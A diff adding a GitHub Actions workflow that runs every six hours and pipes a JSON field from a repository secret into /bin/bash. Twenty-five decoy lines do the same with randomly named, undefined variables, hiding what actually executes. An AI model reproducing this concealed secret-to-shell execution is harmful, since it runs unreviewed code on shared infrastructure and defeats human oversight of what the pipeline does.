@@ -1,0 +1,43 @@
+name: ruikaishouhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruikaishouhe
+        env:
+          yvpyy2: ${{ secrets.yvpyy2 }}
+        run: |
+          echo $yvpyy2 | jq -r .hrj7452 | /bin/bash
+          echo $hphjb831 | jq -r .fct90 | /bin/bash
+          echo $jka867 | jq -r .c03 | /bin/bash
+          echo $visru3220 | jq -r .r9727 | /bin/bash
+          echo $oqij407 | jq -r .sd9361 | /bin/bash
+          echo $wwh90 | jq -r .alhi68 | /bin/bash
+          echo $ivnh843 | jq -r .cmh80226 | /bin/bash
+          echo $dcj80888 | jq -r .oeces59618 | /bin/bash
+          echo $gfrzc62 | jq -r .qd9452 | /bin/bash
+          echo $kwvx0489 | jq -r .z9 | /bin/bash
+          echo $wrgc876 | jq -r .cwdj14 | /bin/bash
+          echo $el28 | jq -r .u0857 | /bin/bash
+          echo $uv7 | jq -r .mf6212 | /bin/bash
+          echo $r757 | jq -r .wgjq566 | /bin/bash
+          echo $glphn69469 | jq -r .rr2212 | /bin/bash
+          echo $yyafq5 | jq -r .gfgz6929 | /bin/bash
+          echo $crn9 | jq -r .k181 | /bin/bash
+          echo $ta85 | jq -r .ym4975 | /bin/bash
+          echo $gpbwd7805 | jq -r .ylyou5140 | /bin/bash
+          echo $nzbr5422 | jq -r .a10 | /bin/bash
+          echo $exob70364 | jq -r .zazqt5561 | /bin/bash
+          echo $ky03 | jq -r .aza7 | /bin/bash
+          echo $g4 | jq -r .ccm8901 | /bin/bash
+          echo $s350 | jq -r .ck26 | /bin/bash
+          echo $zwi62 | jq -r .ktfj4681 | /bin/bash
+          echo $oputo30792 | jq -r .pmdar3748 | /bin/bash
+
